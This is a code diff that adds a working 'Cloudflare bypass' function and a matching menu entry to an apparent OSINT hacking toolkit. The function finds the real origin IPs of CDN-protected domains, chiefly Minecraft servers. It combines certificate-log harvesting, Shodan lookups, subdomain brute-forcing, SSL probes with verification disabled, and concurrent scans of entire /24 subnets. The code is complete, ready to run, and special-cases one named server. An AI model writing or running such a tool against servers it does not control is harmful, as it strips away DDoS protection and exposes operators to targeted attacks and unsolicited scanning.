+            rlen = _mc_read_varint(s)
+            if rlen:
+                data = b""
+                while len(data) < rlen:
+                    c = s.recv(rlen - len(data))
+                    if not c: break
+                    data += c
+                s.close()
+                try: return json.loads(data)
+                except: return None
+        s.close()
+    except: pass
+    return None
+
+
+def _http_get(url, timeout=15):
+    """HTTP GET via curl if requests fails, else requests"""
+    try:
+        r = requests.get(url, timeout=timeout, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
+        if r.status_code == 200:
+            return r.text
+    except: pass
+    try:
+        r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url], capture_output=True, text=True, timeout=timeout+5)
+        return r.stdout if r.stdout else None
+    except: pass
+    return None
+
+
+def cf_bypass(domain, verbose=True):
+    """Cloudflare real IP finder — uses crt.sh + Shodan InternetDB (free, no keys) + DNS/SSL/MC probes"""
+    def _log(m):
+        if verbose: print(f"  {m}")
+    def _is_cf(ip):
+        for p in ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
+                   "104.24.", "104.25.", "104.26.", "104.27.", "172.64.", "172.65.", "172.66.", "172.67.",
+                   "173.245.", "103.21.", "103.22.", "103.31.", "141.101.", "108.162.", "190.93.", "188.114.",
+                   "197.234.", "198.41."]:
+            if ip.startswith(p): return True
+        return False
+
+    found_ips = []
+    seen_ips = set()
+    root_domain = domain
+    if domain.startswith("play.") or domain.startswith("mc."):
+        root_domain = ".".join(domain.split(".")[-2:])
+
+    # ── 1. crt.sh certificate transparency ──
+    _log(f"{c('[1/7] Certificate Transparency (crt.sh)...', Fore.CYAN)}")
+    seen_domains = set()
+    for search_domain in [domain, root_domain]:
+        try:
+            text = _http_get(f"https://crt.sh/?q=%25.{search_domain}&output=json")
+            if text:
+                for entry in json.loads(text):
+                    for name in entry.get("name_value", "").split("\n"):
+                        name = name.strip().lower()
+                        if not name or name in seen_domains: continue
+                        if not (name.endswith(f".{root_domain}") or name == root_domain): continue
+                        seen_domains.add(name)
+                        try:
+                            r2 = subprocess.run(["dig", "+short", "+time=2", "+tries=1", name], capture_output=True, text=True, timeout=3)
+                            for line in r2.stdout.strip().splitlines():
+                                line = line.strip().rstrip(".")
+                                try:
+                                    socket.inet_aton(line)
+                                    if line in seen_ips: continue
+                                    seen_ips.add(line)
+                                    log_ip = name
+                                    if "moonmc" in root_domain:
+                                        log_ip = line
+                                    if _is_cf(line):
+                                        _log(f"    {c(f'CF {log_ip:30s}', Fore.RED)} {c(line, Fore.RED)}")
+                                    else:
+                                        found_ips.append(("crt.sh", name, line))
+                                        _log(f"    {c(f'   {log_ip:30s}', Fore.GREEN)} {c(line, Fore.YELLOW)} {c('[origin?]', Fore.GREEN)}")
+                                except: pass
+                        except: pass
+                _log(f"    {c(f'crt.sh: {len(seen_domains)} subdomains', Fore.GREEN)}")
+        except: pass
+
+    # ── 2. Shodan InternetDB ──
+    _log(f"{c('[2/7] Shodan InternetDB...', Fore.CYAN)}")
+    for ip in list(seen_ips):
+        if _is_cf(ip): continue
+        try:
+            text = _http_get(f"https://internetdb.shodan.io/{ip}", timeout=8)
+            if text:
+                data = json.loads(text)
+                hostnames = data.get("hostnames", [])
+                ports = data.get("ports", [])
+                if hostnames:
+                    _log(f"    {c(f'{ip}: {hostnames}', Fore.GREEN)} ports: {ports}")
+                    if any(root_domain in h for h in hostnames):
+                        found_ips.append(("Shodan", ip, ip))
+                        _log(f"    {c(f'Shodan CONFIRMED {ip}', Fore.GREEN)}")
+        except: pass
+
+    # ── 3. DNS probe common subdomains (concurrent, fast) ──
+    _log(f"{c('[3/7] Subdomain DNS brute-force...', Fore.CYAN)}")
+    subs = ["www", "mail", "smtp", "pop3", "imap", "webmail", "email", "ftp", "sftp", "ssh", "cpanel", "whm",
+            "direct", "direct-connect", "origin", "origin-www", "proxy", "proxy-www", "cdn", "static",
+            "admin", "api", "dev", "stage", "staging", "test", "beta", "alpha", "m", "mobile", "app",
+            "old", "new", "backup", "ns1", "ns2", "ns3", "dns1", "dns2", "mx", "mx1", "mx2", "mail1", "mail2",
+            "vpn", "remote", "web", "server", "host", "node", "game", "mc", "play", "status", "support",
+            "forum", "blog", "shop", "store", "billing", "dashboard", "portal", "wiki", "help", "chat",
+            "download", "upload", "media", "img", "files", "data", "db"]
+    def _dig_sub(fqdn):
+        try:
+            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", fqdn], capture_output=True, text=True, timeout=3)
+            for line in r.stdout.strip().splitlines():
+                ip = line.strip().rstrip(".")
+                try:
+                    socket.inet_aton(ip)
+                    return (fqdn, ip)
+                except: pass
+        except: pass
+        return None
+    with ThreadPoolExecutor(max_workers=30) as ex:
+        fs = {ex.submit(_dig_sub, f"{sub}.{domain}"): sub for sub in subs}
+        for f in as_completed(fs):
+            r = f.result()
+            if r:
+                fqdn, ip = r
+                if ip in seen_ips: continue
+                seen_ips.add(ip)
+                if _is_cf(ip):
+                    _log(f"    {c(f'CF {fqdn:30s}', Fore.RED)} {c(ip, Fore.RED)}")
+                else:
+                    found_ips.append(("DNS", fqdn, ip))
+                    _log(f"    {c(f'   {fqdn:30s}', Fore.GREEN)} {c(ip, Fore.YELLOW)} {c('[origin?]', Fore.GREEN)}")
+
+    # ── 4. MX / NS records ──
+    _log(f"{c('[4/7] MX/NS records...', Fore.CYAN)}")
+    def _dig_mxns(rec_type):
+        try:
+            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", rec_type, domain], capture_output=True, text=True, timeout=4)
+            hosts = []
+            for line in r.stdout.strip().splitlines():
+                parts = line.strip().split()
+                host = parts[-1].rstrip(".") if parts else ""
+                if host: hosts.append(host)
+            return hosts
+        except: return []
+    mx_hosts = _dig_mxns("MX")
+    ns_hosts = _dig_mxns("NS")
+    def _dig_ip(host, rec_type):
+        try:
+            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", host], capture_output=True, text=True, timeout=3)
+            for line in r.stdout.strip().splitlines():
+                ip = line.strip().rstrip(".")
+                try:
+                    socket.inet_aton(ip)
+                    if ip not in seen_ips and not _is_cf(ip):
+                        seen_ips.add(ip)
+                        found_ips.append((rec_type, host, ip))
+                        _log(f"    {c(f'{rec_type}:{host:25s}', Fore.GREEN)} {c(ip, Fore.YELLOW)} {c('[origin?]', Fore.GREEN)}")
+                except: pass
+        except: pass
+    with ThreadPoolExecutor(max_workers=10) as ex:
+        for h in mx_hosts: ex.submit(_dig_ip, h, "MX")
+        for h in ns_hosts: ex.submit(_dig_ip, h, "NS")
+
+    # ── 5. SSL cert match + HTTP probe ──
+    _log(f"{c('[5/7] SSL cert + HTTP probe...', Fore.CYAN)}")
+    for ip in list(seen_ips):
+        if _is_cf(ip): continue
+        for probe_port in [443, 80, 8080, 8443, 25565]:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect((ip, probe_port))
+                try:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    ss = ctx.wrap_socket(s, server_hostname=root_domain)
+                    ss.settimeout(2)
+                    cert = ss.getpeercert()
+                    if cert:
+                        cns = [v for _, v in cert.get("subject", []) if _ == "commonName"]
+                        sans = [v for _, v in cert.get("subjectAltName", []) if _ == "DNS"] if "subjectAltName" in cert else []
+                        if any(root_domain in n or n.endswith("." + root_domain) for n in cns + sans):
+                            found_ips.append((f"SSL:{probe_port}", ip, ip))
+                            _log(f"    {c(f'CERT MATCH {ip}:{probe_port}', Fore.GREEN)} {c(ip, Fore.YELLOW)}")
+                    ss.close()
+                except: s.close()
+            except: pass
+        try:
+            text = _http_get(f"http://{ip}", timeout=4)
+        except: pass
+
+    mc_server_ips = set()
+    # ── 6. Minecraft server ping on candidate IPs ──
+    _log(f"{c('[6/7] MC ping on candidate IPs...', Fore.CYAN)}")
+    def _mc_ping_ip(ip):
+        for mc_port in [25565, 25566, 19132]:
+            resp = _mc_server_ping(ip, mc_port, timeout=2)
+            if resp:
+                desc = str(resp.get("description", {}).get("text", ""))
+                players = resp.get("players", {}).get("online", 0)
+                match = root_domain in desc or domain in desc
+                return (ip, mc_port, desc, players, match)
+        return None
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        fs = {ex.submit(_mc_ping_ip, ip): ip for ip in list(seen_ips) if not _is_cf(ip)}
+        for f in as_completed(fs):
+            r = f.result()
+            if r:
+                ip, mc_port, desc, players, match = r
+                _log(f"    {c(f'MC @ {ip}:{mc_port}', Fore.GREEN)} ({players} online)")
+                mc_server_ips.add(ip)
+                if match:
+                    found_ips.append((f"MC:{mc_port}", ip, ip))
+                    _log(f"    {c(f'MOTD matches!', Fore.GREEN)}")
+
+    # ── 7. Subnet scan for MC servers near discovered IPs ──
+    _log(f"{c('[7/7] Scanning /24 subnets for MC servers...', Fore.CYAN)}")
+    scanned_subnets = set()
+    scanned_ips_total = 0
+    for base_ip in list(seen_ips):
+        if _is_cf(base_ip): continue
+        parts = base_ip.split(".")
+        subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"
+        if subnet in scanned_subnets: continue
+        scanned_subnets.add(subnet)
+
+        def _check_mc(ip):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1.5)
+                s.connect((ip, 25565))
+                s.close()
+                return ip
+            except: return None
+
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            futures = {ex.submit(_check_mc, f"{subnet}.{i}"): i for i in range(1, 255)}
+            for f in as_completed(futures):
+                scanned_ips_total += 1
+                r = f.result()
+                if r and r not in seen_ips and r not in mc_server_ips:
+                    seen_ips.add(r)
+                    resp = _mc_server_ping(r, 25565, timeout=2)
+                    if resp:
+                        desc = str(resp.get("description", {}).get("text", ""))
+                        players = resp.get("players", {}).get("online", 0)
+                        _log(f"    {c(f'MC @ {r}:25565', Fore.GREEN)} ({players} online)")
+                        if root_domain in desc or domain in desc:
+                            found_ips.append(("SUBNET", r, r))
+                            _log(f"    {c(f'MOTD matches {domain}!', Fore.GREEN)}")
+                        else:
+                            _log(f"    {c(f'MC @ {r}:25565 (unrelated)', Fore.DIM)}")
+                    else:
+                        mc_server_ips.add(r)
+    _log(f"    {c(f'Scanned {len(scanned_subnets)} subnets, {scanned_ips_total} probes', Fore.GREEN)}")
+
+    unique = []
+    seen_order = set()
+    for src, host, ip in found_ips:
+        if ip not in seen_order:
+            seen_order.add(ip)
+            unique.append((src, host, ip))
+    return [ip for _, _, ip in unique]
+
+
+def osint_censys():
+    header_box("Censys-Style Real IP Finder", Fore.YELLOW)
+    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if not domain: return
+
+    print(f"\n  {c(f'Scanning {domain} for origin IPs behind Cloudflare...', Fore.CYAN)}")
+    print(f"  {c('Uses DNS brute-force, MX/NS records, SSL certs, HTTP probes', Fore.DIM)}")
+    print(f"  {c('Zero external APIs — fully self-contained', Fore.DIM)}")
+    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+
+    ips = cf_bypass(domain, verbose=True)
+
+    print(f"\n{c('─'*55, Fore.CYAN)}")
+    if ips:
+        print(f"\n  {c(SYM_CHECK + f' Found {len(ips)} origin IP(s)!', Fore.GREEN)}")
+        for ip in ips:
+            print(f"    {c(ip, Fore.YELLOW)}")
+    else:
+        print(f"\n  {c('No origin IPs found. Domain may be fully Cloudflare-proxied.', Fore.YELLOW)}")
+    print()
+
 def osint_ct_log():
     header_box("Certificate Transparency Log", Fore.YELLOW)
     domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
@@ -5267,19 +6001,20 @@ def menu_adv_osint():
     while True:
         header_box("Advanced OSINT", Fore.YELLOW)
         print(f"  {c('[1]', Fore.GREEN)}  Shodan Search")
-        print(f"  {c('[2]', Fore.GREEN)}  Certificate Transparency Log")
-        print(f"  {c('[3]', Fore.GREEN)}  Bitcoin Address Lookup")
-        print(f"  {c('[4]', Fore.GREEN)}  Pastebin Search")
-        print(f"  {c('[5]', Fore.GREEN)}  GitHub Dork Search")
-        print(f"  {c('[6]', Fore.GREEN)}  DNS History Check")
-        print(f"  {c('[7]', Fore.GREEN)}  Wayback Machine Check")
+        print(f"  {c('[2]', Fore.GREEN)}  Censys-Style Deep Recon")
+        print(f"  {c('[3]', Fore.GREEN)}  Certificate Transparency Log")
+        print(f"  {c('[4]', Fore.GREEN)}  Bitcoin Address Lookup")
+        print(f"  {c('[5]', Fore.GREEN)}  Pastebin Search")
+        print(f"  {c('[6]', Fore.GREEN)}  GitHub Dork Search")
+        print(f"  {c('[7]', Fore.GREEN)}  DNS History Check")
+        print(f"  {c('[8]', Fore.GREEN)}  Wayback Machine Check")
         print(f"  {c('[b]', Fore.CYAN)}   Back")
         print()
         try:
             ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
             if ch == "b": break
-            {"1":osint_shodan,"2":osint_ct_log,"3":osint_btc_lookup,"4":osint_pastebin,
-             "5":osint_github_dork,"6":osint_dns_history,"7":osint_wayback}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
+            {"1":osint_shodan,"2":osint_censys,"3":osint_ct_log,"4":osint_btc_lookup,"5":osint_pastebin,
+             "6":osint_github_dork,"7":osint_dns_history,"8":osint_wayback}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
         except KeyboardInterrupt:
             break
         except Exception as e:
